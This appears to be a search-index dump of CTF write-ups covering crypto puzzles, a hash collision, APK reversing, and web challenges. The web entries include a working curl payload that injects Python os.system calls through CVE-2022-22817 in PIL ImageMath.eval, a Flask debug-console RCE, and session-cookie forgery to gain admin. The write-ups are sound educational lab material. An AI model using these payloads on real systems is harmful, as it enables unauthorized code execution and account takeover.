characters:\n1-3,4-4,2-1,3-1,1-5,1-1,4-2,3-3,{,4-4,2-3,4-5,3-2,1-2,4-3,_,4-5,3-5,}  And we are told that the encryption method takes a 5x5 grid with all letters of the alphabet in order. If we do a quick search, we will find Polybius Square, which is this one:\n            A B C D E   F G H I/J K   L M N O P   Q R S T U   V W X Y Z    We can take every pair of i-j and match it to a letter finding the corresponding row-column cell. For instance, 1-1 is A and 5-5 is Z. After decrypting, we get CTFLEARN{THUMBS_UP}, so the flag will be: CTFlearn{THUMBS_UP}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/cryptography/5x5-crypto/","section":"ctf","summary":"Polybius Square","time":1,"title":"5x5 Crypto"},{"contents":"We have a simple website like this one:\nWe can read the HTML source code of the website, which is:\nThere is an image called background.png, but we did not observe any image on the website. We can try to access it using curl:\n$ curl http://35.190.155.168/9a968e7787/background.png ^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$  And we have the flag.\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/hacker101ctf/a-little-something-to-get-you-started/","section":"ctf","summary":"Website source code","time":1,"title":"A little something to get you started"},{"contents":"We are given this output:\nPython 3.8.10 (default, Mar 15 2022, 12:22:08) [GCC 9.4.0] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. \u0026gt;\u0026gt;\u0026gt; import random \u0026gt;\u0026gt;\u0026gt; from Crypto.Cipher import AES \u0026gt;\u0026gt;\u0026gt; key = random.choice(open(\"rockyou.txt\", \"rb\").readlines()[:10000]).strip() \u0026gt;\u0026gt;\u0026gt; key = key.zfill(16) \u0026gt;\u0026gt;\u0026gt; cipher = AES.new(key, AES.MODE_ECB) \u0026gt;\u0026gt;\u0026gt; cipher.encrypt(open(\"flag.txt\", \"rb\").read().zfill(48)) b\"\\xd6\\x19O\\xbeA\\xb0\\x15\\x87\\x0e\\xc7\\xc4\\xc1\\xe9h\\xd8\\xe6\\xc6\\x95\\x82\\xaa#\\x91\\xdb2l\\xfa\\xf7\\xe1C\\xb8\\x11\\x04\\x82p\\xe5\\x9e\\xb1\\x0c*\\xcc[('\\x0f\\xcc\\xa7W\\xff\"  It is an output from Python REPL. It takes a random password from rockyou.txt and uses it as the key to encrypt the flag with AES ECB. We are also given the ciphertext.\nWe only need to take the passwords inside rockyou.txt and perform the decryption until we find one flag that decrypts well (that is, the plain text contains ictf{):\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; ct = b\"\\xd6\\x19O\\xbeA\\xb0\\x15\\x87\\x0e\\xc7\\xc4\\xc1\\xe9h\\xd8\\xe6\\xc6\\x95\\x82\\xaa#\\x91\\xdb2l\\xfa\\xf7\\xe1C\\xb8\\x11\\x04\\x82p\\xe5\\x9e\\xb1\\x0c*\\xcc[('\\x0f\\xcc\\xa7W\\xff\" \u0026gt;\u0026gt;\u0026gt; keys = open(\"rockyou.txt\", \"rb\").readlines()[:10000] \u0026gt;\u0026gt;\u0026gt; from Crypto.Cipher import AES \u0026gt;\u0026gt;\u0026gt; for key in keys: ... try: ... cipher = AES.new(key.strip().zfill(16), AES.MODE_ECB) ... pt = cipher.decrypt(ct) ... if b'ictf{' in pt: ... print(key, pt) ... break ... except: ... pass ... b'biscuit\\n' b'0000000000000000000ictf{d0nt_us3_w3ak_k3ys!!!!}\\n'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/aes/","section":"ctf","summary":"ImaginaryCTF 09/08/2022. 50 points. AES. Weak password. Brute force","time":1,"title":"aes"},{"contents":"We got the Python source code of the server:\nfromsecretimportFLAG fromhashlibimportsha512 importsocketserver importsignal fromrandomimportrandint WELCOME=\"\"\" **************** Welcome to the Hash Game. **************** * * * Hash functions are really spooky. * * In this game you will have to face your fears. * * Can you find a colision in the updated sha512? * * * *********************************************************** \"\"\" classHandler(socketserver.BaseRequestHandler): defhandle(self): signal.alarm(0) main(self.request) classReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass defsendMessage(s, msg): s.send(msg.encode()) defreceiveMessage(s, msg): sendMessage(s, msg) returns.recv(4096).decode().strip() classahs512(): def__init__(self, message): self.message=message self.key=self.generateKey() defgenerateKey(self): whileTrue: key=randint(2, len(self.message) -1) iflen(self.message) %key==0: break returnkey deftranspose(self, message): transposed=[0for_inmessage] columns=len(message) //self.key fori, charinenumerate(message): row=i//columns col=i%columns transposed[col*self.key+row] =char returnbytes(transposed) defrotate(self, message): return[((b\u0026gt;\u0026gt;4) |(b\u0026lt;\u0026lt;3)) \u0026amp;0xffforbinmessage] defhexdigest(self): transposed=self.transpose(self.message) rotated=self.rotate(transposed) returnsha512(bytes(rotated)).hexdigest() defmain(s): sendMessage(s, WELCOME) original_message=b\"pumpkin_spice_latte!\" original_digest=ahs512(original_message).hexdigest() sendMessage( s, f\"\\nFind a message that generate the same hash as thisone: {original_digest}\\n\" ) whileTrue: try: message=receiveMessage(s, \"\\nEnter your message: \") message=bytes.fromhex(message) digest=ahs512(message).hexdigest() if((original_digest==digest) and(message!=original_message)): sendMessage(s, f\"\\n{FLAG}\\n\") else: sendMessage(s, \"\\nConditions not satisfied!\\n\") exceptKeyboardInterrupt: sendMessage(s, \"\\n\\nExiting\") exit(1) exceptExceptionase: sendMessage(s, f\"\\nAn error occurred while processing data: {e}\\n\") if__name__=='__main__': socketserver.TCPServer.allow_reuse_address=True server=ReusableTCPServer((\"0.0.0.0\", 1337), Handler) server.serve_forever()  Basically, the server uses a custom hashing function (AHS512) and we are asked to find a collision with a given hash:\n$ nc 134.122.106.203 32713 **************** Welcome to the Hash Game. **************** * * * Hash functions are really spooky. * * In this game you will have to face your fears. * * Can you find a colision in the updated sha512? * * * *********************************************************** Find a message that generate the same hash as this one: 94650ece878870dd2e6a62addeabb803c6b5a49223d47c8e4b91073b0ffee8dd2b57eec03d8f616742792e4c7f5f671fa46f8eb97a4840a5ea03f2f2beeabc35 Enter your message:  The original message is this one:\noriginal_message=b\"pumpkin_spice_latte!\" original_digest=ahs512(original_message).hexdigest()  Analyzing the hash function The custom hash function creates a random key as follows:\ndefgenerateKey(self): whileTrue: key=randint(2, len(self.message) -1) iflen(self.message) %key==0: break returnkey  Basically, the key is a random number between 2 and the length of the input message, which is a short interval.\nWhen calling the hexdigest method, the actual hash is computed:\ndefhexdigest(self): transposed=self.transpose(self.message) rotated=self.rotate(transposed) returnsha512(bytes(rotated)).hexdigest()  As can be seen, at the very end the function computes the SHA512 hash, however the input was transposed and rotated before.\nTransposition This is transpose:\ndeftranspose(self, message): transposed=[0for_inmessage] columns=len(message) //self.key fori, charinenumerate(message): row=i//columns col=i%columns transposed[col*self.key+row] =char returnbytes(transposed)  Basically, it shuffles the characters. We can check it with the Python REPL:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from server import ahs512 \u0026gt;\u0026gt;\u0026gt; original_message = b\"pumpkin_spice_latte!\" \u0026gt;\u0026gt;\u0026gt; ahs512(original_message).transpose(original_message) b'piiaunctm_etps_ekpl!' \u0026gt;\u0026gt;\u0026gt; ahs512(original_message).transpose(original_message) b'piucmep_kliant_tsep!' \u0026gt;\u0026gt;\u0026gt; ahs512(original_message).transpose(original_message) b'piiaunctm_etps_ekpl!' \u0026gt;\u0026gt;\u0026gt; ahs512(original_message).transpose(original_message) b'piiaunctm_etps_ekpl!' \u0026gt;\u0026gt;\u0026gt; ahs512(original_message).transpose(original_message) b'pksetuip_tmnilep_ca!' \u0026gt;\u0026gt;\u0026gt; ahs512(original_message).transpose(original_message) b'piiaunctm_etps_ekpl!' \u0026gt;\u0026gt;\u0026gt; ahs512(original_message).transpose(original_message) b'piucmep_kliant_tsep!' \u0026gt;\u0026gt;\u0026gt; ahs512(original_message).transpose(original_message) b'pmknsielteupi_pc_at!'  Probably, there\u0026rsquo;s a way to sort the characters of the original message so that after transpose, they have the same ordering as the original message\u0026rsquo;s hash. However, I took another approach.\nRotation This is rotate:\ndefrotate(self, message): return[((b\u0026gt;\u0026gt;4) |(b\u0026lt;\u0026lt;3)) \u0026amp;0xffforbinmessage]  The above function performs some bit operations on each character of the transposed message. For instance, let\u0026rsquo;s take character p, which is ASCII 0x70, or 0111 0000 in binary. The rotate function will output 0000 0111 | 1000 000 = 1000 0111.\nFinding the flaw The thing here is that there are ASCII characters that get the same result after rotate. Let\u0026rsquo;s use letters instead of bits. Let\u0026rsquo;s say our character is ABCD EFGH in binary. Then, rotate will do 0000 ABCD | DEFG H000 = DEFG XBCD, where there\u0026rsquo;s a new value X = A | H. Therefore, if X is set to 1, then we have three possibilities: A = H = 1, A = 0; H = 1 and A = 1; H = 0.\nFor example, we can take the underscore _, which is 0x5f in hexadecimal, or 0101 1111 in binary. Since A = 0 and H = 1, we know that X = 1, so, we can set A = 1 and obtain the same result. That is, replace each _ by \\xdf (in binary, 1101 1111).\nSo that\u0026rsquo;s what we are going to do. Then, we will send the same message to the server until we find the flag. Recall that the key is different for each iteration, although the interval is short, so we can do a bit of brute force:\ndefmain(): host, port=sys.argv[1].split(':') p=remote(host, int(port)) p.recvuntil(b'Find a message that generate the same hash as this one: ') target=p.recvline().strip().decode() original_message=b\"pumpkin_spice_latte!\" message=original_message.replace(b'_', b'\\xdf') p.sendlineafter(b'Enter your message: ', message.hex().encode()) p.recvline() answer=p.recvline() whileb'Conditions not satisfied!'inanswer: p.sendlineafter(b'Enter your message: ', message.hex().encode()) p.recvline() answer=p.recvline(2) p.close() print(answer.decode().strip())  Flag If we execute the above script, we will find the flag:\n$ python3 solve.py 134.122.106.203:32713 [+] Opening connection to 134.122.106.203 on port 32713: Done [*] Closed connection to 134.122.106.203 port 32713 HTB{5h4512_8u7_w17h_4_7w157_83f023_c4n_93n32473_c0111510n5}  The full script can be found in here: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/ahs512/","section":"ctf","summary":"Custom hash function. Bit operations","time":4,"title":"AHS512"},{"contents":"We got the Python source code of the server:\nfromsecretimportFLAG fromhashlibimportsha512 importsocketserver importsignal fromrandomimportrandint WELCOME=\"\"\" **************** Welcome to the Hash Game. **************** * * * Hash functions are really spooky. * * In this game you will have to face your fears. * * Can you find a colision in the updated sha512? * * * *********************************************************** \"\"\" classHandler(socketserver.BaseRequestHandler): defhandle(self): signal.alarm(0) main(self.request) classReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass defsendMessage(s, msg): s.send(msg.encode()) defreceiveMessage(s, msg): sendMessage(s, msg) returns.recv(4096).decode().strip() classahs512(): def__init__(self, message): self.message=message self.key=self.generateKey() defgenerateKey(self): whileTrue: key=randint(2, len(self.message) -1) iflen(self.message) %key==0: break returnkey deftranspose(self, message): transposed=[0for_inmessage] columns=len(message) //self.key fori, charinenumerate(message): row=i//columns col=i%columns transposed[col*self.key+row] =char returnbytes(transposed) defrotate(self, message): return[((b\u0026gt;\u0026gt;4) |(b\u0026lt;\u0026lt;3)) \u0026amp;0xffforbinmessage] defhexdigest(self): transposed=self.transpose(self.message) rotated=self.rotate(transposed) returnsha512(bytes(rotated)).hexdigest() defmain(s): sendMessage(s, WELCOME) original_message=b\"pumpkin_spice_latte!\" original_digest=ahs512(original_message).hexdigest() sendMessage( s, f\"\\nFind a message that generate the same hash as thisone: {original_digest}\\n\" ) whileTrue: try: message=receiveMessage(s, \"\\nEnter your message: \") message=bytes.fromhex(message) digest=ahs512(message).hexdigest() if((original_digest==digest) and(message!=original_message)): sendMessage(s, f\"\\n{FLAG}\\n\") else: sendMessage(s, \"\\nConditions not satisfied!\\n\") exceptKeyboardInterrupt: sendMessage(s, \"\\n\\nExiting\") exit(1) exceptExceptionase: sendMessage(s, f\"\\nAn error occurred while processing data: {e}\\n\") if__name__=='__main__': socketserver.TCPServer.allow_reuse_address=True server=ReusableTCPServer((\"0.0.0.0\", 1337), Handler) server.serve_forever()  Basically, the server uses a custom hashing function (AHS512) and we are asked to find a collision with a given hash:\n$ nc 134.122.106.203 32713 **************** Welcome to the Hash Game. **************** * * * Hash functions are really spooky. * * In this game you will have to face your fears. * * Can you find a colision in the updated sha512? * * * *********************************************************** Find a message that generate the same hash as this one: 94650ece878870dd2e6a62addeabb803c6b5a49223d47c8e4b91073b0ffee8dd2b57eec03d8f616742792e4c7f5f671fa46f8eb97a4840a5ea03f2f2beeabc35 Enter your message:  The original message is this one:\noriginal_message=b\"pumpkin_spice_latte!\" original_digest=ahs512(original_message).hexdigest()  Analyzing the hash function The custom hash function creates a random key as follows:\ndefgenerateKey(self): whileTrue: key=randint(2, len(self.message) -1) iflen(self.message) %key==0: break returnkey  Basically, the key is a random number between 2 and the length of the input message, which is a short interval.\nWhen calling the hexdigest method, the actual hash is computed:\ndefhexdigest(self): transposed=self.transpose(self.message) rotated=self.rotate(transposed) returnsha512(bytes(rotated)).hexdigest()  As can be seen, at the very end the function computes the SHA512 hash, however the input was transposed and rotated before.\nTransposition This is transpose:\ndeftranspose(self, message): transposed=[0for_inmessage] columns=len(message) //self.key fori, charinenumerate(message): row=i//columns col=i%columns transposed[col*self.key+row] =char returnbytes(transposed)  Basically, it shuffles the characters. We can check it with the Python REPL:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from server import ahs512 \u0026gt;\u0026gt;\u0026gt; original_message = b\"pumpkin_spice_latte!\" \u0026gt;\u0026gt;\u0026gt; ahs512(original_message).transpose(original_message) b'piiaunctm_etps_ekpl!' \u0026gt;\u0026gt;\u0026gt; ahs512(original_message).transpose(original_message) b'piucmep_kliant_tsep!' \u0026gt;\u0026gt;\u0026gt; ahs512(original_message).transpose(original_message) b'piiaunctm_etps_ekpl!' \u0026gt;\u0026gt;\u0026gt; ahs512(original_message).transpose(original_message) b'piiaunctm_etps_ekpl!' \u0026gt;\u0026gt;\u0026gt; ahs512(original_message).transpose(original_message) b'pksetuip_tmnilep_ca!' \u0026gt;\u0026gt;\u0026gt; ahs512(original_message).transpose(original_message) b'piiaunctm_etps_ekpl!' \u0026gt;\u0026gt;\u0026gt; ahs512(original_message).transpose(original_message) b'piucmep_kliant_tsep!' \u0026gt;\u0026gt;\u0026gt; ahs512(original_message).transpose(original_message) b'pmknsielteupi_pc_at!'  Probably, there\u0026rsquo;s a way to sort the characters of the original message so that after transpose, they have the same ordering as the original message\u0026rsquo;s hash. However, I took another approach.\nRotation This is rotate:\ndefrotate(self, message): return[((b\u0026gt;\u0026gt;4) |(b\u0026lt;\u0026lt;3)) \u0026amp;0xffforbinmessage]  The above function performs some bit operations on each character of the transposed message. For instance, let\u0026rsquo;s take character p, which is ASCII 0x70, or 0111 0000 in binary. The rotate function will output 0000 0111 | 1000 000 = 1000 0111.\nFinding the flaw The thing here is that there are ASCII characters that get the same result after rotate. Let\u0026rsquo;s use letters instead of bits. Let\u0026rsquo;s say our character is ABCD EFGH in binary. Then, rotate will do 0000 ABCD | DEFG H000 = DEFG XBCD, where there\u0026rsquo;s a new value X = A | H. Therefore, if X is set to 1, then we have three possibilities: A = H = 1, A = 0; H = 1 and A = 1; H = 0.\nFor example, we can take the underscore _, which is 0x5f in hexadecimal, or 0101 1111 in binary. Since A = 0 and H = 1, we know that X = 1, so, we can set A = 1 and obtain the same result. That is, replace each _ by \\xdf (in binary, 1101 1111).\nSo that\u0026rsquo;s what we are going to do. Then, we will send the same message to the server until we find the flag. Recall that the key is different for each iteration, although the interval is short, so we can do a bit of brute force:\ndefmain(): host, port=sys.argv[1].split(':') p=remote(host, int(port)) p.recvuntil(b'Find a message that generate the same hash as this one: ') target=p.recvline().strip().decode() original_message=b\"pumpkin_spice_latte!\" message=original_message.replace(b'_', b'\\xdf') p.sendlineafter(b'Enter your message: ', message.hex().encode()) p.recvline() answer=p.recvline() whileb'Conditions not satisfied!'inanswer: p.sendlineafter(b'Enter your message: ', message.hex().encode()) p.recvline() answer=p.recvline(2) p.close() print(answer.decode().strip())  Flag If we execute the above script, we will find the flag:\n$ python3 solve.py 134.122.106.203:32713 [+] Opening connection to 134.122.106.203 on port 32713: Done [*] Closed connection to 134.122.106.203 port 32713 HTB{533_7h47_w45n'7_50_5c42y_4f732_411}  The full script can be found in here: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/ahs512/","section":"ctf","summary":"Custom hash function. Bit operations","time":4,"title":"AHS512"},{"contents":"We are given a website to analyze. The index file shows the server source code:\n#!/usr/bin/env python3 fromflaskimportFlask, render_template_string, request, Response app=Flask(__name__) @app.route('/') defindex(): returnResponse(open(__file__).read(), mimetype='text/plain') @app.route('/ssti') defssti(): query=request.args['query'] iflen(query) \u0026gt;2: return\"Too long!\" returnrender_template_string(query) app.run('0.0.0.0', 3002, debug=True)  It is a website built with Flask, in Python. One interesting thing is that debug mode is enabled.\nThe challenge talks about SSTI (Server-Side Template Injection), but we can only enter a 2-byte payload. This length makes it impossible to exploit an SSTI. The only thing we can do is cause an error with {{:\nSince debug mode is enabled, we can open a Python interactive console on this page (clicking on the console icon button). So we have Remote Code Execution and thus can read the flag:\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/almost-ssti/","section":"ctf","summary":"ImaginaryCTF 13/07/2022. 50 points. Server-Side Template Injection. Flask console","time":1,"title":"Almost SSTI"},{"contents":"We have the following website, that mimics the game Among Us:\nThere is a button to select a color with a color picker:\nIf we analyze the given source code, we have a Flask application (in Python). This is application/blueprints/routes.py:\nfromflaskimportBlueprint, request, render_template, abort fromapplication.utilimportmake_alpha web=Blueprint('web', __name__) api=Blueprint('api', __name__) @web.route('/') defindex(): returnrender_template('index.html') @api.route('/alphafy', methods=['POST']) defalphafy(): ifnotrequest.is_jsonor'image'notinrequest.json: returnabort(400) returnmake_alpha(request.json)  The function make_alpha is defined in application/util.py:\nimportos, base64 fromPILimportImage, ImageMath fromioimportBytesIO generate=lambdax: os.urandom(x).hex() defmake_alpha(data): color=data.get('background', [255,255,255]) try: dec_img=base64.b64decode(data.get('image').encode()) image=Image.open(BytesIO(dec_img)).convert('RGBA') img_bands=[band.convert('F') forbandinimage.split()] alpha=ImageMath.eval( f'''float( max( max( max( difference1(red_band, {color[0]}), difference1(green_band, {color[1]}) ), difference1(blue_band, {color[2]}) ), max( max( difference2(red_band, {color[0]}), difference2(green_band, {color[1]}) ), difference2(blue_band, {color[2]}) ) ) )''', difference1=lambdasource, color: (source-color) /(255.0-color), difference2=lambdasource, color: (color-source) /color, red_band=img_bands[0], green_band=img_bands[1], blue_band=img_bands[2] ) new_bands=[ ImageMath.eval( 'convert((image - color) / alpha + color, \"L\")', image=img_bands[i], color=color[i], alpha=alpha ) foriinrange(3) ] new_bands.append(ImageMath.eval( 'convert(alpha_band * alpha, \"L\")', alpha=alpha, alpha_band=img_bands[3] )) new_image=Image.merge('RGBA', new_bands) background=Image.new('RGB', new_image.size, (0, 0, 0, 0)) background.paste(new_image.convert('RGB'), mask=new_image) buffer=BytesIO() new_image.save(buffer, format='PNG') return{ 'image': f'data:image/png;base64,{base64.b64encode(buffer.getvalue()).decode()}' }, 200 exceptException: return'', 400  The issue here is the use of ImageMath.eval. Actually, there\u0026rsquo;s CVE-2022-22817. We are able to use exec and run arbitrary Python code.\nThe injection is in the background parameter, which should be an RGB value, but it is not validated. Hence, we can try the injection importing the os module and running a sleep command (we need to be careful with quotes and backslashes):\n$ time curl 178.62.114.46:32326/api/alphafy -d '{\"background\":[\"exec(\\\"import os; os.system(\\\\\\\"sleep 5\\\\\\\")\\\")\",255,255],\"image\":\"'$(base64 challenge/application/static/images/arrow.png)'\"}' -H 'Content-Type: application/json' curl: (52) Empty reply from server 5,23 real 0,00 user 0,00 sys  Since the response lasts more than 5 seconds, we have Remote Code Execution (RCE). Now, we can move the flag.txt file to the static directory and read the flag:\n$ curl 178.62.114.46:32326/api/alphafy -d '{\"background\":[\"exec(\\\"import os; os.system(\\\\\\\"cat /flag.txt \u0026gt; /app/application/static/flag.txt\\\\\\\")\\\")\",255,255],\"image\":\"'$(base64 challenge/application/static/images/arrow.png)'\"}' -H 'Content-Type: application/json' curl: (52) Empty reply from server $ curl 178.62.114.46:32326/static/flag.txt HTB{sl33p1ng_my_way_into_RCE}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/amidst-us/","section":"ctf","summary":"Python. Third-party dependencies. Code Injection. RCE","time":2,"title":"Amidst Us"},{"contents":"We have the Python source code to launch a local instance for the challenge:\n$ python3 source.py  $ nc 127.0.0.1 1337 DEBUG MSG - Generating The Global DH Parameters DEBUG MSG - g = 2, p = 10177459997049772558637057109490700048394574760284564283959324525695097805837401714582821820424475480057537817583807249627119267268524840254542683041588432363128111683358536204391767254517057859973149680238170237977230020947732558089671785239121778309357814575486749623687357688511361367822815452806637006568922401890961240475060822815400430220536180181951862931844638638933951683988349468373510128406899660648258602475728913837826845743111489145006566908004165703542907243208106044538037004824530893555918497937074663828069774495573109072469750423175863678445547058247156187317168731446722852098571735569138516533993 DEBUG MSG - Calculation Complete DEBUG MSG - Generating The Public Key of CPU... DEBUG MSG - Calculation Complete DEBUG MSG - Public Key is: ??? Enter The Public Key of The Memory:  Taking a look at the source code, we see that the program expects a number $M$ from us to generate a shared secret.\nIt is employing a sort of Diffie-Hellman key exchange algorithm, but not correctly. In fact, the program asks for a number $M$ so that the shared secret will be $M^c \\pmod{p}$, where $c$ is an unknown random number and $p$ is a fix modulus that we know from the source code and the debug message above:\nshared_secret = pow(M, c, p)  Then, this shared secret is used to decrypt a message from us. If we were able to provide an encrypted message so that it decrypts as \u0026quot;Initialization Sequence - Code 0\u0026quot;, we will get the flag:\nencrypted_sequence = recieveMessage( s, \"Enter The Encrypted Initialization Sequence: \") try: encrypted_sequence = bytes.fromhex(encrypted_sequence) assert len(encrypted_sequence) % 16 == 0 except: sendMessage(s, DEBUG_MSG + \"Unexpected Error Occured\\n\") exit() sequence = decrypt(encrypted_sequence, shared_secret) if sequence == b\"Initialization Sequence - Code 0\": sendMessage(s, \"\\n\" + DEBUG_MSG + \"Reseting The Protocol With The New Shared Key\\n\") sendMessage(s, DEBUG_MSG + f\"{FLAG}\") else: exit()  Recall that the shared secret is computed as $M^c \\pmod p$, and we control $M$, so if we enter $M = 1$, the shared secret will be just $1$. So we can use the same encryption method to encrypt \u0026quot;Initialization Sequence - Code 0\u0026quot; and send the ciphertext.\n$ python3 solve.py 165.227.224.55:31355 [+] Opening connection to 165.227.224.55 on port 31355: Done DEBUG MSG - HTB{7h15_15_cr3@t3d_by_Danb3er_@nd_h@s_c0pyr1gh7_1aws!_!} [*] Closed connection to 165.227.224.55 port 31355  The full script can be found in here: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/android-in-the-middle/","section":"ctf","summary":"Diffie-Hellman. MITM","time":2,"title":"Android-in-the-middle"},{"contents":"We are given an APK file (APKrypt.apk). We need to find a VIP code inside the APK file. Hence, we will use d2j-dex2jar to get a JAR file:\n$ d2j-dex2jar APKrypt.apk dex2jar APKrypt.apk - ./APKrypt-dex2jar.jar  Now we upload the JAR file into www.javadecompilers.com and select Jadx as decompiler.\nThe main file is at sources/com/example/apkrypt/MainActivity.java:\npackagecom.example.apkrypt; importandroid.app.Activity; importandroid.os.Bundle; importandroid.util.Base64; importandroid.view.View; importandroid.widget.Button; importandroid.widget.EditText; importandroid.widget.Toast; importjava.security.Key; importjava.security.MessageDigest; importjava.security.NoSuchAlgorithmException; importjavax.crypto.Cipher; importjavax.crypto.spec.SecretKeySpec; publicclassMainActivityextendsActivity{ /* renamed from: b1 */ Buttonf77b1; EditTexted1; publicstaticStringdecrypt(Stringstr) throwsException{ KeygenerateKey =generateKey(); Cipherinstance =Cipher.getInstance(\"AES\"); instance.init(2, generateKey); returnnewString(instance.doFinal(Base64.decode(str, 0)), \"utf-8\"); } publicstaticStringencrypt(Stringstr) throwsException{ KeygenerateKey =generateKey(); Cipherinstance =Cipher.getInstance(\"AES\"); instance.init(1, generateKey); returnBase64.encodeToString(instance.doFinal(str.getBytes(\"utf-8\")), 0); } privatestaticKeygenerateKey() throwsException{ returnnewSecretKeySpec(\"Dgu8Trf6Ge4Ki9Lb\".getBytes(), \"AES\"); } publicstaticStringmd5(Stringstr) { try{ MessageDigestinstance =MessageDigest.getInstance(\"MD5\"); instance.update(str.getBytes()); byte[] digest =instance.digest(); StringBufferstringBuffer =newStringBuffer(); for(byteb :digest) { stringBuffer.append(Integer.toHexString(b \u0026amp;255)); } returnstringBuffer.toString(); } catch(NoSuchAlgorithmExceptione) { e.printStackTrace(); return\"\"; } } /* access modifiers changed from: protected */ publicvoidonCreate(Bundlebundle) { super.onCreate(bundle); setContentView(C0535R.layout.activity_main); this.f77b1 =(Button) findViewById(C0535R.C0538id.button); this.ed1 =(EditText) findViewById(C0535R.C0538id.editTextVipCode); this.f77b1.setOnClickListener(newView.OnClickListener() { publicvoidonClick(Viewview) { try{ if(MainActivity.md5(MainActivity.this.ed1.getText().toString()).equals(\"735c3628699822c4c1c09219f317a8e9\")) { Toast.makeText(MainActivity.this.getApplicationContext(), MainActivity.decrypt(\"k+RLD5J86JRYnluaZLF3Zs/yJrVdVfGo1CQy5k0+tCZDJZTozBWPn2lExQYDHH1l\"), 1).show(); } else{ Toast.makeText(MainActivity.this.getApplicationContext(), \"Wrong VIP code!\", 0).show(); } } catch(Exceptione) { e.printStackTrace(); } } }); } }  First, it asks for a VIP code in onCreate and checks its MD5 hash with 735c3628699822c4c1c09219f317a8e9. If we use crackstation.net we won\u0026rsquo;t find any match:\nIndeed, we are not interested in the VIP code but in what comes after. If we entered a correct VIP code, then a ciphertext that is encoded in Base64 (k+RLD5J86JRYnluaZLF3Zs/yJrVdVfGo1CQy5k0+tCZDJZTozBWPn2lExQYDHH1l) would be decrypted. The cipher is AES, and we got the key (Dgu8Trf6Ge4Ki9Lb). Hence, let\u0026rsquo;s decrypt it using Python:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from base64 import b64decode \u0026gt;\u0026gt;\u0026gt; from Crypto.Cipher import AES \u0026gt;\u0026gt;\u0026gt; from Crypto.Util.Padding import unpad \u0026gt;\u0026gt;\u0026gt; key = b'Dgu8Trf6Ge4Ki9Lb' \u0026gt;\u0026gt;\u0026gt; ct = b64decode('k+RLD5J86JRYnluaZLF3Zs/yJrVdVfGo1CQy5k0+tCZDJZTozBWPn2lExQYDHH1l') \u0026gt;\u0026gt;\u0026gt; cipher = AES.new(key, AES.MODE_ECB) \u0026gt;\u0026gt;\u0026gt; unpad(cipher.decrypt(ct), AES.block_size) b'HTB{3nj0y_y0ur_v1p_subscr1pt1on}'  ","image":"/images/mobile.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/mobile/apkrypt/","section":"ctf","summary":"Reversing APK file. AES cipher","time":2,"title":"APKrypt"},{"contents":"We are asked to compute -arcsin(-1) * 0.2 (in radians) and take the digits between positions 10000 and 10099 of the decimal part of the result.\nFirst of all, let\u0026rsquo;s do the math:\n$$ \\sin{\\left(\\frac{-\\pi}{2}\\right)} = -1 \\iff \\arcsin{(-1)} = \\frac{-\\pi}{2} $$\nNotice that the inverse sine function is bounded: $\\frac{-\\pi}{2} \\leq \\arcsin{x} \\leq \\frac{\\pi}{2}$ for $x \\in \\mathbb{R}$. Therefore:\n$$ -\\arcsin{(-1)} \\cdot 0.2 = - \\left(\\frac{-\\pi}{2}\\right) \\cdot 0.2 = \\frac{\\pi}{10} $$\nSo we are asked for the 10000th-10099th digits of $\\pi$. We are given a sanity check:\n in case I messed up - first digit is 7, last digit is 2, 100 digits total\n So the flag is:\nictf{7856672279661988578279484885583439751874454551296563443480396642055798293680435220277098429423253302}\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/imaginaryctf/arcsin1/","section":"ctf","summary":"ImaginaryCTF 14/08/2022. 50 points. Inverse sine of a number","time":1,"title":"arcsin1"},{"contents":"We are given a PNG image called art.png:\n$ file art.png art.png: PNG image data, 300 x 300, 8-bit/color RGBA, non-interlaced  We might think that the flag is somehow encoded in the colors that appear in the image. Actually, after a bit of research, we can find out that there is an esoteric language called npiet that encodes text in images with colors:\nThe examples look similar to what we have, so let\u0026rsquo;s try it:\nAnd there\u0026rsquo;s the flag: HTB{p137_m0ndr14n}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/misc/art/","section":"ctf","summary":"npiet esoteric language","time":1,"title":"Art"},{"contents":"We are provided with this webpage:\nFirst, we can register a new account (asdf as username):\nAnd we are told that we are not admin. In fact, the authentication is handled with session cookies:\nThe session cookie looks encoded in Base64, so let\u0026rsquo;s try to decode it (beware of URL encoding):\n$ echo eyJ1c2VybmFtZSI6ImFzZGYifQ== | base64 -d {\"username\":\"asdf\"}  It shows our username, so maybe we can modify the cookie and get access as admin:\n$ echo -n '{\"username\":\"admin\"}' | base64 eyJ1c2VybmFtZSI6ImFkbWluIn0=  If the server is vulnerable, when we refresh the page, the cookie will tell the server that we are admin. And there we have the flag (HTB{s3ss10n_1nt3grity_1s_0v3r4tt3d_4nyw4ys}):\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/baby-auth/","section":"ctf","summary":"Session cookies. Authentication bypass","time":1,"title":"baby auth"},{"contents":"We are provided with this webpage:\nAt the bottom of the page we have a text input. Let\u0026rsquo;s enter something and submit.\nIt shows an error in the Laravel debugger (a PHP framework):\nThis is a bad practice and a security issue, since debuggers might contain sensitive information and most of them provide ways to execute code.\nFlag Indeed, we can find the flag in an environment variable named APP_KEY 